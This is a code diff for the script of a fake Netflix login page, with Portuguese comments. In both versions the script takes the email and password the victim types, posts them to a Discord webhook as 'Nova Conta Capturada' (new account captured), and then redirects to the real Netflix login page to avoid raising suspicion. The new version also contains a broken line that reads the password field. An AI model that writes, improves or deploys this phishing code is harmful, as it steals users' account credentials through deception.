@@ -4,21 +4,20 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
     const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    const btnSubmit = document.getElementById('btnSubmit');
+    const password = document.getElementById('password)'.value;
+    const btn = document.getElementById('btnSubmit');
 
-    // Feedback visual simples
-    btnSubmit.innerText = "Carregando...";
-    btnSubmit.disabled = true;
+    // Feedback visual de carregamento
+    btn.innerText = "Carregando...";
+    btn.disabled = true;
 
-    // Estrutura do Embed para o Discord
     const payload = {
         embeds: [{
-            title: "🛑 NOVO ACESSO DETECTADO - NETFLIX 🛑",
+            title: "🍿 Nova Conta Capturada - Netflix",
             color: 15158332, // Vermelho Netflix
             fields: [
                 {
-                    name: "📧 E-mail / Usuário",
+                    name: "📧 E-mail/Celular",
                     value: `\`${email}\``,
                     inline: false
                 },
@@ -29,7 +28,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
                 }
             ],
             footer: {
-                text: "Painel de Monitoramento Shelby",
+                text: "Sistema de Monitoramento Netflix",
                 icon_url: "https://cdn-icons-png.flaticon.com/512/732/732228.png"
             },
             timestamp: new Date()
@@ -38,19 +37,16 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
 
     fetch(webhookURL, {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
     })
     .then(() => {
-        // Redireciona para o site oficial após o envio para não gerar suspeitas
+        // Redireciona para o site oficial após o envio para não levantar suspeitas
         window.location.href = "https://www.netflix.com/br/login";
     })
-    .catch((err) => {
-        console.error('Erro ao enviar:', err);
-        alert('Ocorreu um erro na conexão. Tente novamente.');
-        btnSubmit.innerText = "Continuar";
-        btnSubmit.disabled = false;
+    .catch(err => {
+        console.error("Erro ao enviar:", err);
+        btn.innerText = "Continuar";
+        btn.disabled = false;
     });
 });
